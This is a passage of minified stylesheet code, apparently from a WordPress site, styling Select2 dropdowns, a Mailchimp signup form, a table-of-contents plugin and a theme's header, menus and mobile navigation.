.select2-selection--single{border-bottom-left-radius:0;border-bottom-right-radius:0}.select2-container--default .select2-search--dropdown .select2-search__field{border:1px solid #aaa}.select2-container--default .select2-search--inline .select2-search__field{background:0 0;border:none;outline:0;box-shadow:none;-webkit-appearance:textfield}.select2-container--default .select2-results>.select2-results__options{max-height:200px;overflow-y:auto}.select2-container--default .select2-results__option[role=group]{padding:0}.select2-container--default .select2-results__option[aria-disabled=true]{color:#999}.select2-container--default .select2-results__option[aria-selected=true]{background-color:#ddd}.select2-container--default .select2-results__option .select2-results__option{padding-left:1em}.select2-container--default .select2-results__option .select2-results__option .select2-results__group{padding-left:0}.select2-container--default .select2-results__option .select2-results__option .select2-results__option{margin-left:-1em;padding-left:2em}.select2-container--default .select2-results__option .select2-results__option .select2-results__option .select2-results__option{margin-left:-2em;padding-left:3em}.select2-container--default .select2-results__option .select2-results__option .select2-results__option .select2-results__option .select2-results__option{margin-left:-3em;padding-left:4em}.select2-container--default .select2-results__option .select2-results__option .select2-results__option .select2-results__option .select2-results__option .select2-results__option{margin-left:-4em;padding-left:5em}.select2-container--default .select2-results__option .select2-results__option .select2-results__option .select2-results__option .select2-results__option .select2-results__option .select2-results__option{margin-left:-5em;padding-left:6em}.select2-container--default .select2-results__option--highlighted[aria-selected]{background-color:#5897fb;color:#fff}.select2-container--default .select2-results__group{cursor:default;display:block;padding:6px}.select2-container--classic .select2-selection--single{background-color:#f7f7f7;border:1px solid #aaa;border-radius:4px;outline:0;background-image:-webkit-linear-gradient(top,#fff 50%,#eee 100%);background-image:-o-linear-gradient(top,#fff 50%,#eee 100%);background-image:linear-gradient(to bottom,#fff 50%,#eee 100%);background-repeat:repeat-x}.select2-container--classic .select2-selection--single:focus{border:1px solid #5897fb}.select2-container--classic .select2-selection--single .select2-selection__rendered{color:#444;line-height:28px}.select2-container--classic .select2-selection--single .select2-selection__clear{cursor:pointer;float:right;font-weight:700;margin-right:10px}.select2-container--classic .select2-selection--single .select2-selection__placeholder{color:#999}.select2-container--classic .select2-selection--single .select2-selection__arrow{background-color:#ddd;border:none;border-left:1px solid #aaa;border-top-right-radius:4px;border-bottom-right-radius:4px;height:26px;position:absolute;top:1px;right:1px;width:20px;background-image:-webkit-linear-gradient(top,#eee 50%,#ccc 100%);background-image:-o-linear-gradient(top,#eee 50%,#ccc 100%);background-image:linear-gradient(to bottom,#eee 50%,#ccc 100%);background-repeat:repeat-x}.select2-container--classic .select2-selection--single .select2-selection__arrow b{border-color:#888 transparent transparent;border-style:solid;border-width:5px 4px 0;height:0;left:50%;margin-left:-4px;margin-top:-2px;position:absolute;top:50%;width:0}.select2-container--classic[dir=rtl] .select2-selection--single .select2-selection__clear{float:left}.select2-container--classic[dir=rtl] .select2-selection--single .select2-selection__arrow{border:none;border-right:1px solid #aaa;border-radius:0;border-top-left-radius:4px;border-bottom-left-radius:4px;left:1px;right:auto}.select2-container--classic.select2-container--open .select2-selection--single{border:1px solid #5897fb}.select2-container--classic.select2-container--open .select2-selection--single .select2-selection__arrow{background:0 0;border:none}.select2-container--classic.select2-container--open .select2-selection--single .select2-selection__arrow b{border-color:transparent transparent #888;border-width:0 4px 5px}.select2-container--classic.select2-container--open.select2-container--above .select2-selection--single{border-top:none;border-top-left-radius:0;border-top-right-radius:0;background-image:-webkit-linear-gradient(top,#fff 0,#eee 50%);background-image:-o-linear-gradient(top,#fff 0,#eee 50%);background-image:linear-gradient(to bottom,#fff 0,#eee 50%);background-repeat:repeat-x}.select2-container--classic.select2-container--open.select2-container--below .select2-selection--single{border-bottom:none;border-bottom-left-radius:0;border-bottom-right-radius:0;background-image:-webkit-linear-gradient(top,#eee 50%,#fff 100%);background-image:-o-linear-gradient(top,#eee 50%,#fff 100%);background-image:linear-gradient(to bottom,#eee 50%,#fff 100%);background-repeat:repeat-x}.select2-container--classic .select2-selection--multiple{background-color:#fff;border:1px solid #aaa;border-radius:4px;cursor:text;outline:0}.select2-container--classic .select2-selection--multiple:focus{border:1px solid #5897fb}.select2-container--classic .select2-selection--multiple .select2-selection__rendered{list-style:none;margin:0;padding:0 5px}.select2-container--classic .select2-selection--multiple .select2-selection__clear{display:none}.select2-container--classic .select2-selection--multiple .select2-selection__choice{background-color:#e4e4e4;border:1px solid #aaa;border-radius:4px;cursor:default;float:left;margin-right:5px;margin-top:5px;padding:0 5px}.select2-container--classic .select2-selection--multiple .select2-selection__choice__remove{color:#888;cursor:pointer;display:inline-block;font-weight:700;margin-right:2px}.select2-container--classic .select2-selection--multiple .select2-selection__choice__remove:hover{color:#555}.select2-container--classic[dir=rtl] .select2-selection--multiple .select2-selection__choice{float:right;margin-left:5px;margin-right:auto}.select2-container--classic[dir=rtl] .select2-selection--multiple .select2-selection__choice__remove{margin-left:2px;margin-right:auto}.select2-container--classic.select2-container--open .select2-selection--multiple{border:1px solid #5897fb}.select2-container--classic.select2-container--open.select2-container--above .select2-selection--multiple{border-top:none;border-top-left-radius:0;border-top-right-radius:0}.select2-container--classic.select2-container--open.select2-container--below .select2-selection--multiple{border-bottom:none;border-bottom-left-radius:0;border-bottom-right-radius:0}.select2-container--classic .select2-search--dropdown .select2-search__field{border:1px solid #aaa;outline:0}.select2-container--classic .select2-search--inline .select2-search__field{outline:0;box-shadow:none}.select2-container--classic .select2-dropdown{background-color:#fff;border:1px solid transparent}.select2-container--classic .select2-dropdown--above{border-bottom:none}.select2-container--classic .select2-dropdown--below{border-top:none}.select2-container--classic .select2-results>.select2-results__options{max-height:200px;overflow-y:auto}.select2-container--classic .select2-results__option[role=group]{padding:0}.select2-container--classic .select2-results__option[aria-disabled=true]{color:grey}.select2-container--classic .select2-results__option--highlighted[aria-selected]{background-color:#3875d7;color:#fff}.select2-container--classic .select2-results__group{cursor:default;display:block;padding:6px}.select2-container--classic.select2-container--open .select2-dropdown{border-color:#5897fb}.mc4wp-form input[name^=_mc4wp_honey]{display:none!important}.mc4wp-form-basic{margin:1em 0}.mc4wp-form-basic input,.mc4wp-form-basic label{box-sizing:border-box;cursor:auto;vertical-align:baseline;width:auto;height:auto;line-height:normal;display:block}.mc4wp-form-basic input:after,.mc4wp-form-basic label:after{content:"";clear:both;display:table}.mc4wp-form-basic label{margin-bottom:6px;font-weight:700;display:block}.mc4wp-form-basic input[type=date],.mc4wp-form-basic input[type=email],.mc4wp-form-basic input[type=tel],.mc4wp-form-basic input[type=text],.mc4wp-form-basic input[type=url],.mc4wp-form-basic select,.mc4wp-form-basic textarea{width:100%;max-width:480px;min-height:32px}.mc4wp-form-basic input[type=number]{min-width:40px}.mc4wp-form-basic input[type=checkbox],.mc4wp-form-basic input[type=radio]{border:0;width:13px;height:13px;margin:0 6px 0 0;padding:0;display:inline-block;position:relative}.mc4wp-form-basic input[type=checkbox]{-webkit-appearance:checkbox;-moz-appearance:checkbox;appearance:checkbox}.mc4wp-form-basic input[type=radio]{-webkit-appearance:radio;-moz-appearance:radio;appearance:radio}.mc4wp-form-basic button,.mc4wp-form-basic input[type=button],.mc4wp-form-basic input[type=submit]{cursor:pointer;-webkit-appearance:none;-moz-appearance:none;appearance:none;display:inline-block}.mc4wp-form-basic label>span,.mc4wp-form-basic li>label{font-weight:400}.rtl .mc4wp-form-basic input[type=checkbox],.rtl .mc4wp-form-basic input[type=radio]{margin:0 0 0 6px}#ez-toc-container{background:#f9f9f9;border:1px solid #aaa;border-radius:4px;-webkit-box-shadow:0 1px 1px rgba(0,0,0,.05);box-shadow:0 1px 1px rgba(0,0,0,.05);display:table;margin-bottom:1em;padding:10px 20px 10px 10px;position:relative;width:auto}div.ez-toc-widget-container{padding:0;position:relative}div.ez-toc-widget-container ul{display:block}div.ez-toc-widget-container li{border:none;padding:0}div.ez-toc-widget-container ul.ez-toc-list{padding:10px}#ez-toc-container ul ul{margin-left:1.5em}#ez-toc-container li,#ez-toc-container ul{padding:0}#ez-toc-container li,#ez-toc-container ul,#ez-toc-container ul li,div.ez-toc-widget-container,div.ez-toc-widget-container li{background:0 0;list-style:none;line-height:1.6;margin:0;overflow:hidden;z-index:1}#ez-toc-container .ez-toc-title{text-align:left;line-height:1.45;margin:0;padding:0}.ez-toc-title-container{display:table;width:100%}.ez-toc-title,.ez-toc-title-toggle{display:inline;text-align:left;vertical-align:middle}.ez-toc-btn{display:inline-block;font-weight:400}#ez-toc-container div.ez-toc-title-container+ul.ez-toc-list{margin-top:1em}#ez-toc-container a{color:#444;box-shadow:none;text-decoration:none;text-shadow:none;display:inline-flex;align-items:stretch;flex-wrap:nowrap}#ez-toc-container a:visited{color:#9f9f9f}#ez-toc-container a:hover{text-decoration:underline}#ez-toc-container a.ez-toc-toggle{display:flex;align-items:center}.ez-toc-widget-container ul.ez-toc-list li::before{content:' ';position:absolute;left:0;right:0;height:30px;line-height:30px;z-index:-1}.ez-toc-widget-container ul.ez-toc-list li.active{background-color:#ededed}.ez-toc-widget-container li.active>a{font-weight:900}.ez-toc-btn{padding:6px 12px;margin-bottom:0;font-size:14px;line-height:1.428571429;text-align:center;white-space:nowrap;vertical-align:middle;cursor:pointer;background-image:none;border:1px solid transparent;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;-o-user-select:none;user-select:none}.ez-toc-btn:focus{outline:#333 dotted thin;outline:-webkit-focus-ring-color auto 5px;outline-offset:-2px}.ez-toc-btn:focus,.ez-toc-btn:hover{color:#333;text-decoration:none}.ez-toc-btn.active,.ez-toc-btn:active{background-image:none;outline:0;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px rgba(0,0,0,.125)}.ez-toc-btn-default{color:#333;background-color:#fff;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,.15),0 1px 1px rgba(0,0,0,.075);box-shadow:inset 0 1px 0 rgba(255,255,255,.15),0 1px 1px rgba(0,0,0,.075);text-shadow:0 1px 0 #fff;background-image:-webkit-gradient(linear,left 0,left 100%,from(#fff),to(#e0e0e0));background-image:-webkit-linear-gradient(top,#fff 0,#e0e0e0 100%);background-image:-moz-linear-gradient(top,#fff 0,#e0e0e0 100%);background-image:linear-gradient(to bottom,#fff 0,#e0e0e0 100%);background-repeat:repeat-x;border-color:#ccc}.ez-toc-btn-default.active,.ez-toc-btn-default:active,.ez-toc-btn-default:focus,.ez-toc-btn-default:hover{color:#333;background-color:#ebebeb;border-color:#adadad}.ez-toc-btn-default.active,.ez-toc-btn-default:active{background-image:none;background-color:#e0e0e0;border-color:#dbdbdb}.ez-toc-btn-xs{padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}.ez-toc-btn-xs{padding:1px 5px}.ez-toc-btn-default:active{-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,.125);box-shadow:inset 0 3px 5px rgba(0,0,0,.125)}.btn.active,.ez-toc-btn:active{background-image:none}.ez-toc-btn-default:focus,.ez-toc-btn-default:hover{background-color:#e0e0e0;background-position:0 -15px}.ez-toc-pull-right{float:right!important;margin-left:10px}#ez-toc-container input,.ez-toc-toggle #item{position:absolute;left:-999em}#ez-toc-container input[type=checkbox]:checked+nav,#ez-toc-widget-container input[type=checkbox]:checked+nav{opacity:0;max-height:0;border:none;display:none}#ez-toc-container .ez-toc-js-icon-con,#ez-toc-container label{position:relative;cursor:pointer;display:initial}#ez-toc-container .ez-toc-js-icon-con,#ez-toc-container .ez-toc-toggle label{float:right;position:relative;font-size:16px;padding:0;border:1px solid #999191;border-radius:5px;cursor:pointer;left:10px;width:35px}div#ez-toc-container .ez-toc-title{display:initial}#ez-toc-container a.ez-toc-toggle{color:#444;background:inherit;border:inherit}#ez-toc-container .eztoc-toggle-hide-by-default,.eztoc-hide{display:none}.ez-toc-widget-container ul li a{padding-left:10px;display:inline-flex;align-items:stretch;flex-wrap:nowrap}.ez-toc-widget-container ul.ez-toc-list li{height:auto!important}.ez-toc-icon-toggle-span{display:flex;align-items:center;width:35px;height:30px;justify-content:center;direction:ltr}div#ez-toc-container .ez-toc-title{font-size:120%}div#ez-toc-container .ez-toc-title{font-weight:500}div#ez-toc-container ul li,div#ez-toc-container ul li a{font-size:95%}div#ez-toc-container ul li,div#ez-toc-container ul li a{font-weight:500}div#ez-toc-container nav ul ul li{font-size:90%}.ez-toc-container-direction{direction:ltr}.ez-toc-counter ul{counter-reset:item}.ez-toc-counter nav ul li a::before{content:counters(item, '.', decimal) '. ';display:inline-block;counter-increment:item;flex-grow:0;flex-shrink:0;margin-right:.2em;float:left}.ez-toc-widget-container ul{counter-reset:item}.ez-toc-widget-container nav ul li a::before{content:counters(item, '.', decimal) '. ';display:inline-block;counter-increment:item;flex-grow:0;flex-shrink:0;margin-right:.2em;float:left}[data-mfp-src]{cursor:pointer}:root{--td_theme_color:#4db2ec;--td_grid_border_color:#ededed;--td_black:#222;--td_text_color:#111;--td_default_google_font_1:'Open Sans','Open Sans Regular',sans-serif;--td_default_google_font_2:'Roboto',sans-serif}audio,canvas,progress,video{display:block;vertical-align:baseline}*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}:after,:before{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}img{max-width:100%;height:auto}.td-main-content-wrap{background-color:#fff}.td-page-meta{display:none}.td-container{width:1068px;margin-right:auto;margin-left:auto}.td-container:after,.td-container:before{display:table;content:'';line-height:0}.td-container:after{clear:both}.td-pb-row{margin-right:-24px;margin-left:-24px;position:relative}.td-pb-row:after,.td-pb-row:before{display:table;content:''}.td-pb-row:after{clear:both}.td-boxed-layout .vc_row{width:auto;left:0;padding-left:0;padding-right:0}.td-pb-row [class*=td-pb-span]{display:block;min-height:1px;float:left;padding-right:24px;padding-left:24px;position:relative}@media (min-width:1019px) and (max-width:1140px){.td-pb-row [class*=td-pb-span]{padding-right:20px;padding-left:20px}}@media (min-width:768px) and (max-width:1018px){.td-pb-row [class*=td-pb-span]{padding-right:14px;padding-left:14px}}@media (max-width:767px){.td-pb-row [class*=td-pb-span]{padding-right:0;padding-left:0;float:none;width:100%}}.td-ss-main-sidebar{-webkit-backface-visibility:hidden;-webkit-perspective:1000}.td-pb-span4{width:33.33333333%}.td-pb-span8{width:66.66666667%}.td-pb-span12{width:100%}.td-block-row{margin-left:-24px;margin-right:-24px}.td-block-row:after,.td-block-row:before{display:table;content:''}.td-block-row:after{clear:both}.td-block-row [class*=td-block-span]{display:block;min-height:1px;float:left;padding-right:24px;padding-left:24px}.td-block-span6{width:50%}.td-block-span12{width:100%}@media (min-width:1019px) and (max-width:1140px){.td-block-row [class*=td-block-span]{padding-right:20px;padding-left:20px}.td-container{width:980px}.td-block-row,.td-pb-row{margin-right:-20px;margin-left:-20px}}@media (min-width:768px) and (max-width:1018px){.td-block-row [class*=td-block-span]{padding-right:14px;padding-left:14px}.td-container{width:740px}.td-block-row,.td-pb-row{margin-right:-14px;margin-left:-14px}}@media (max-width:767px){.td-block-row [class*=td-block-span]{padding-right:0;padding-left:0;float:none;width:100%}.td-container{width:100%;padding-left:20px;padding-right:20px}.td-block-row,.td-pb-row{width:100%;margin-left:0;margin-right:0}}.td-header-wrap{position:relative;z-index:2000}.td-header-row{font-family:var(--td_default_google_font_1,'Open Sans','Open Sans Regular',sans-serif)}.td-header-row:after,.td-header-row:before{display:table;content:''}.td-header-row:after{clear:both}.td-header-row [class*=td-header-sp]{display:block;min-height:1px;float:left;padding-right:24px;padding-left:24px}@media (min-width:1019px) and (max-width:1140px){.td-header-row [class*=td-header-sp]{padding-right:20px;padding-left:20px}}@media (min-width:768px) and (max-width:1018px){.td-header-row [class*=td-header-sp]{padding-right:14px;padding-left:14px}}.td-header-gradient:before{content:"";background:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAMBAMAAABRpcpkAAAAD1BMVEUAAAAAAAAAAAAAAAAAAABPDueNAAAABXRSTlMGAhQQCyEd++8AAAAUSURBVAjXY1AAQgMgdABCCBAAQQAT6AFRBPHcWgAAAABJRU5ErkJggg==');width:100%;height:12px;position:absolute;left:0;bottom:-12px;z-index:1}#td-header-search-button-mob{display:none}@media (max-width:767px){.td-header-row [class*=td-header-sp]{padding-right:0;padding-left:0;float:none;width:100%}#td-header-search-button{display:none}#td-header-search-button-mob{display:block}}@media (min-width:768px){.td-drop-down-search .td-search-form{margin:20px}}.td-header-wrap .td-drop-down-search{position:absolute;top:100%;right:0;visibility:hidden;opacity:0;-webkit-transition:.4s;transition:all .4s ease;transform:translate3d(0,20px,0);-webkit-transform:translate3d(0,20px,0);background-color:#fff;-webkit-box-shadow:0 2px 6px rgba(0,0,0,.2);box-shadow:0 2px 6px rgba(0,0,0,.2);border-top:0;width:342px;pointer-events:none}.td-header-wrap .td-drop-down-search.td-drop-down-search-open{visibility:visible;opacity:1;transform:translate3d(0,0,0);-webkit-transform:translate3d(0,0,0);pointer-events:auto}.td-header-wrap .td-drop-down-search .btn{position:absolute;height:32px;min-width:67px;line-height:17px;padding:7px 15px 8px;text-shadow:none;vertical-align:top;right:20px;margin:0!important;-webkit-transition:background-color .4s;transition:background-color .4s}.td-header-wrap .td-drop-down-search .btn:hover{background-color:var(--td_theme_color,#4db2ec)}.td-header-wrap .td-drop-down-search:before{position:absolute;top:-9px;right:19px;display:block;content:'';width:0;height:0;border-style:solid;border-width:0 5.5px 6px;border-color:transparent transparent var(--td_theme_color,#4db2ec) transparent}.td-header-wrap .td-drop-down-search:after{position:absolute;top:-3px;display:block;content:'';right:0;left:0;margin:0 auto;width:100%;height:3px;background-color:var(--td_theme_color,#4db2ec)}.td-header-wrap #td-header-search{width:235px;height:32px;margin:0;border-right:0;line-height:17px;border-color:#eaeaea!important}.td-header-menu-wrap-full{z-index:9998;position:relative}@media (max-width:767px){.td-header-wrap #td-header-search{width:91%;font-size:16px}.td-header-wrap .td-header-main-menu,.td-header-wrap .td-header-menu-wrap,.td-header-wrap .td-header-menu-wrap-full{background-color:var(--td_mobile_menu_color,#222)!important;height:54px!important}.header-search-wrap .td-icon-search{color:var(--td_mobile_icons_color,#fff)!important}}.td-header-wrap .td-header-menu-wrap-full{background-color:#fff}.td-header-main-menu{position:relative;z-index:999;padding-right:48px}.sf-menu,.sf-menu li,.sf-menu ul{margin:0;list-style:none}.sf-menu ul{position:absolute;top:-999em;width:10em}.sf-menu>li.td-normal-menu>ul.sub-menu{left:-15px}.sf-menu ul li{width:100%}.sf-menu li:hover{visibility:inherit}.sf-menu li{float:left;position:relative}.sf-menu .td-menu-item>a{display:block;position:relative}.sf-menu li.sfHover ul,.sf-menu li:hover ul{left:0;top:auto;z-index:99}ul.sf-menu li.sfHover li ul,ul.sf-menu li:hover li ul{top:-999em}ul.sf-menu li li.sfHover ul,ul.sf-menu li li:hover ul{left:10em;top:0!important}ul.sf-menu li li.sfHover li ul,ul.sf-menu li li:hover li ul{top:-999em}.sf-menu>.current-menu-item{z-index:0}.sf-menu>li>a{padding:0 14px;line-height:48px;font-size:14px;color:#000;font-weight:700;text-transform:uppercase;-webkit-backface-visibility:hidden}.sf-menu>.current-menu-item>a,.sf-menu>.sfHover,.sf-menu>.sfHover>a,.sf-menu>li>a:hover{z-index:999}.sf-menu>.current-menu-item>a,.sf-menu>.sfHover>a,.sf-menu>li>a:hover{background-color:transparent}.td-affix .sf-menu>.current-menu-item>a,.td-affix .sf-menu>.sfHover>a,.td-affix .sf-menu>li>a:hover{background-color:transparent}.sf-menu>li>a:after{background-color:transparent;content:'';width:0;height:3px;position:absolute;bottom:0;left:0;right:0;margin:0 auto;-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0);-webkit-transition:width .2s;transition:width .2s ease}.sf-menu>.current-menu-item>a:after,.sf-menu>.sfHover>a:after,.sf-menu>li:hover>a:after{background-color:var(--td_theme_color,#4db2ec);width:100%}#td-header-menu{display:inline-block;vertical-align:top}.td-normal-menu ul{box-shadow:1px 1px 4px rgba(0,0,0,.15)}.sf-menu .td-normal-menu ul{padding:15px 0}.sf-menu .td-normal-menu ul ul{margin:-15px 0}.sf-menu ul{background-color:#fff}.sf-menu ul .td-menu-item>a{padding:7px 30px;font-size:12px;line-height:20px;color:#111}.sf-menu ul .td-icon-menu-down{float:right;top:0;font-size:7px}.sf-menu ul .current-menu-item>a,.sf-menu ul .sfHover>a,.sf-menu ul .td-menu-item>a:hover{color:var(--td_theme_color,#4db2ec)}.sf-menu a:active,.sf-menu a:focus,.sf-menu a:hover,.sf-menu li.sfHover,.sf-menu li:hover{outline:0}.sf-menu .td-icon-menu-down{position:absolute;top:50%;margin-top:-5px;padding-left:7px;font-size:9px}@media (min-width:768px) and (max-width:1018px){.sf-menu>li.td-normal-menu>ul.sub-menu{left:-5px}.sf-menu>li>a{padding:0 9px;font-size:11px}.sf-menu .td-normal-menu ul{padding:8px 0}.sf-menu .td-normal-menu ul ul{margin:-8px 0}.sf-menu ul .td-menu-item>a{padding:5px 16px 6px;font-size:11px}.sf-menu .td-icon-menu-down{padding-left:6px}}.sf-menu .sub-menu{-webkit-backface-visibility:hidden}.sf-menu .sub-menu .td-icon-menu-down{position:absolute;top:50%;right:19px;margin-top:-9px;line-height:19px}.sf-menu a.sf-with-ul{padding-right:31px;min-width:1px}a.sf-with-ul i.td-icon-menu-down:before{content:'\e808'}ul.sf-js-enabled>li>a>i.td-icon-menu-down:before{content:'\e806'!important}.header-search-wrap{position:absolute;top:0;right:0;z-index:999}.header-search-wrap .td-icon-search{display:inline-block;font-size:19px;width:48px;line-height:48px;text-align:center}@media (min-width:768px) and (max-width:1018px){.sf-menu a.sf-with-ul{padding-right:22px}.header-search-wrap .td-icon-search{font-size:15px}}#td-outer-wrap{overflow:hidden}#td-top-mobile-toggle{display:none}#td-top-mobile-toggle a{display:inline-block}#td-top-mobile-toggle i{font-size:27px;width:64px;line-height:54px;height:54px;display:inline-block;padding-top:1px;color:var(--td_mobile_icons_color,#fff)}.admin-bar #td-mobile-nav{padding-top:32px}@media (max-width:767px){.td-header-main-menu{padding-right:64px;padding-left:2px}.sf-menu{display:none}.header-search-wrap .td-icon-search{height:54px;width:54px;line-height:54px;font-size:22px;margin-right:2px}#td-outer-wrap{margin:auto;width:100%;-webkit-transition:transform .7s;transition:transform .7s ease;-webkit-transform-origin:50% 200px 0;transform-origin:50% 200px 0}#td-top-mobile-toggle{display:inline-block;position:relative}.admin-bar #td-mobile-nav{padding-top:46px}}.td-menu-background{background-repeat:var(--td_mobile_background_repeat,no-repeat);background-size:var(--td_mobile_background_size,cover);background-position:var(--td_mobile_background_size,center top);position:fixed;top:0;display:block;width:100%;height:113%;z-index:9999;visibility:hidden;transform:translate3d(-100%,0,0);-webkit-transform:translate3d(-100%,0,0)}.td-menu-background:before{content:'';width:100%;height:100%;position:absolute;top:0;left:0;opacity:.98;background:#313b45;background:-webkit-gradient(left top,left bottom,color-stop(0%,var(--td_mobile_gradient_one_mob,#313b45)),color-stop(100%,var(--td_mobile_gradient_two_mob,#3393b8)));background:linear-gradient(to bottom,var(--td_mobile_gradient_one_mob,#313b45) 0%,var(--td_mobile_gradient_two_mob,#3393b8) 100%)}#td-mobile-nav{padding:0;position:fixed;width:100%;height:calc(100% + 1px);top:0;z-index:9999;visibility:hidden;transform:translate3d(-99%,0,0);-webkit-transform:translate3d(-99%,0,0);left:-1%;font-family:-apple-system,".SFNSText-Regular","San Francisco",Roboto,"Segoe UI","Helvetica Neue","Lucida Grande",sans-serif}#td-mobile-nav .td_display_err{text-align:center;color:var(--td_mobile_text_color,#fff);border:none;-webkit-box-shadow:0 0 8px rgba(0,0,0,.16);box-shadow:0 0 8px rgba(0,0,0,.16);margin:-9px -30px 24px;font-size:14px;border-radius:0;padding:12px;position:relative;background-color:rgba(255,255,255,.06);display:none}#td-mobile-nav input:invalid{box-shadow:none!important}.td-js-loaded #td-mobile-nav,.td-js-loaded .td-menu-background{visibility:visible!important;-webkit-transition:transform .5s cubic-bezier(.79, .14, .15, .86);transition:transform .5s cubic-bezier(.79, .14, .15, .86)}#td-mobile-nav{height:1px;overflow:hidden}#td-mobile-nav .td-menu-socials{padding:0 65px 0 20px;overflow:hidden;height:60px}#td-mobile-nav .td-social-icon-wrap{margin:20px 5px 0 0;display:inline-block}#td-mobile-nav .td-social-icon-wrap i{border:none;background-color:transparent;font-size:14px;width:40px;height:40px;line-height:38px;color:var(--td_mobile_text_color,#fff);vertical-align:middle}.td-mobile-close{position:absolute;right:1px;top:0;z-index:1000}.td-mobile-close .td-icon-close-mobile{height:70px;width:70px;line-height:70px;font-size:21px;color:var(--td_mobile_text_color,#fff);top:4px;position:relative}.td-mobile-content{padding:20px 20px 0}.td-mobile-container{padding-bottom:20px;position:relative}.td-mobile-content ul{list-style:none;margin:0;padding:0}.td-mobile-content li{float:none;margin-left:0;-webkit-touch-callout:none;-webkit-user-select:none;user-select:none}.td-mobile-content li a{display:block;line-height:21px;font-size:21px;color:var(--td_mobile_text_color,#fff);margin-left:0;padding:12px 30px 12px 12px;font-weight:700}.td-mobile-content .td_mobile_submenu>a .td-icon-menu-right{display:inline-block}.td-mobile-content .td-icon-menu-right{display:none;position:absolute;cursor:pointer;top:10px;right:-4px;z-index:1000;font-size:14px;padding:6px 12px;float:right;color:var(--td_mobile_text_color,#fff);-webkit-transform-origin:50% 48% 0px;transform-origin:50% 48% 0px;-webkit-transition:transform .3s;transition:transform .3s ease;transform:rotate(-90deg);-webkit-transform:rotate(-90deg)}.td-mobile-content .td-icon-menu-right:before{content:'\e83d'}.td-mobile-content .td-sub-menu-open>a i{transform:rotate(0);-webkit-transform:rotate(0)}.td-mobile-content .td-sub-menu-open>ul{display:block;max-height:2000px;opacity:.9}.td-mobile-content .sub-menu{max-height:0;overflow:hidden;opacity:0;-webkit-transition:max-height .5s cubic-bezier(.77, 0, .175, 1),opacity .5s cubic-bezier(.77, 0, .175, 1);transition:max-height .5s cubic-bezier(.77, 0, .175, 1),opacity .5s cubic-bezier(.77, 0, .175, 1)}.td-mobile-content .sub-menu .td-icon-menu-right{font-size:11px;right:-2px;top:8px;color:var(--td_mobile_text_color,#fff)}.td-mobile-content .sub-menu a{padding:9px 26px 9px 36px!important;line-height:19px;font-size:16px;font-weight:400}.td-mobile-content .sub-menu .sub-menu a{padding-left:55px!important}.td-mobile-content .sub-menu .sub-menu .sub-menu a{padding-left:74px!important}.td-mobile-content .current-menu-item>a{color:var(--td_mobile_text_active_color,#73c7e3)}.td-mobile-content .menu-item-has-children a{width:100%;z-index:1}.td-mobile-content .td-link-element-after{position:relative}.rtl .td-mobile-content .td-icon-menu-right{right:auto;left:-4px;transform:rotate(90deg);-webkit-transform:rotate(90deg)}.rtl .td-mobile-content .td-sub-menu-open>a i{transform:rotate(0);-webkit-transform:rotate(0)}.td-menu-mob-open-menu #td-outer-wrap{position:fixed;transform:scale3d(.9,.9,.9);-webkit-transform:scale3d(.9,.9,.9);-webkit-box-shadow:0 0 46px #000;box-shadow:0 0 46px #000}.td-menu-mob-open-menu #td-mobile-nav{height:calc(100% + 1px);overflow:auto;transform:translate3d(0,0,0);-webkit-transform:translate3d(0,0,0);left:0}.td-menu-mob-open-menu #td-mobile-nav label{-webkit-transition:.2s;transition:all .2s ease}.td-menu-mob-open-menu #td-mobile-nav .td-login-animation{-webkit-transition:.5s .5s;transition:all .5s ease .5s}.td-menu-mob-open-menu .td-menu-background{transform:translate3d(0,0,0);-webkit-transform:translate3d(0,0,0)}.td-menu-mob-open-menu .td-mobile-container{-webkit-transition:.5s .5s;transition:all .5s ease .5s}.td-mobile-container{opacity:1}.td-hide-menu-content .td-mobile-container{opacity:0;visibility:hidden;-webkit-transition:.5s;transition:all .5s ease 0s}.td-hide-menu-content .td-mobile-content{display:none}#td-mobile-nav .td-login-animation{opacity:0;position:absolute;top:0;width:100%}#td-mobile-nav .td-login-animation .td-login-inputs{height:76px}#td-mobile-nav .td-login-hide{-webkit-transition:.5s;transition:all .5s ease 0s;visibility:hidden!important}#td-mobile-nav .td-login-show{visibility:visible!important;opacity:1;pointer-events:auto}.td-search-wrap-mob{padding:0;position:absolute;width:100%;height:auto;top:0;text-align:center;z-index:9999;visibility:hidden;color:var(--td_mobile_text_color,#fff);font-family:-apple-system,".SFNSText-Regular","San Francisco",Roboto,"Segoe UI","Helvetica Neue","Lucida Grande",sans-serif}.td-search-wrap-mob .td-drop-down-search{opacity:0;visibility:hidden;-webkit-transition:.5s;transition:all .5s ease 0s;-webkit-backface-visibility:hidden;position:relative}.td-search-wrap-mob #td-header-search-mob{color:var(--td_mobile_text_color,#fff);font-weight:700;font-size:26px;height:40px;line-height:36px;border:0;background:0 0;outline:0;margin:8px 0;padding:0;text-align:center}.td-search-wrap-mob .td-search-input{margin:0 5%;position:relative}.td-search-wrap-mob .td-search-input span{opacity:.8;font-size:12px}.td-search-wrap-mob .td-search-input:after,.td-search-wrap-mob .td-search-input:before{content:'';position:absolute;display:block;width:100%;height:1px;background-color:var(--td_mobile_text_color,#fff);bottom:0;left:0;opacity:.2}.td-search-wrap-mob .td-search-input:after{opacity:.8;transform:scaleX(0);-webkit-transform:scaleX(0);-webkit-transition:transform .5s .8s;transition:transform .5s ease .8s}.td-search-wrap-mob .td_module_wrap{text-align:left}.td-search-wrap-mob .td_module_wrap .entry-title{font-size:16px;line-height:20px}.td-search-wrap-mob .td_module_wrap .entry-title a{color:var(--td_mobile_text_color,#fff)}.td-search-wrap-mob .td_module_wrap:hover .entry-title a{color:var(--td_mobile_text_color,#fff)}.td-search-wrap-mob .td-post-date{color:var(--td_mobile_text_color,#ddd);opacity:.8}.td-search-wrap-mob .td-search-form{margin-bottom:30px}.td-search-wrap-mob .td-aj-search-results{margin:0 5%;text-align:left}.td-search-wrap-mob .td-module-thumb{top:auto;left:auto}.td-search-wrap-mob .result-msg{margin:0 5%}.td-search-wrap-mob 